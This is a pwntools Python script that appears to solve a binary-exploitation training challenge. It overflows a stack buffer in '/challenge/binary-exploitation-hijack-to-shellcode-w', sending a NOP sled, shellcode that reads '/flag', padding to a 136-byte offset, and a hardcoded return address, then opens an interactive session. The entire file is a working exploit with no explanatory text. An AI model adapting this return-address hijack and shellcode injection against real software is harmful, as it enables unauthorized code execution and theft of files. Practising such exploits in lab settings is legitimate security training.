from pwn import *
from pwn import asm, context, process
from pwnlib.shellcraft import shellcraft

context.update(arch="amd64", os="linux")
context.log_level = "error"

binary_path = "/challenge/binary-exploitation-hijack-to-shellcode-w"
p = process(binary_path)

target_address = 0x7FFFFFFFD1B0

offset = 136
nop_sled = b"\x90" * 32
shellcode = asm(shellcraft.cat("/flag"))

padding_len = offset - len(shellcode) - len(nop_sled)

payload = nop_sled + shellcode + (b"A" * padding_len) + p64(target_address)

p.send(payload)

p.interactive()
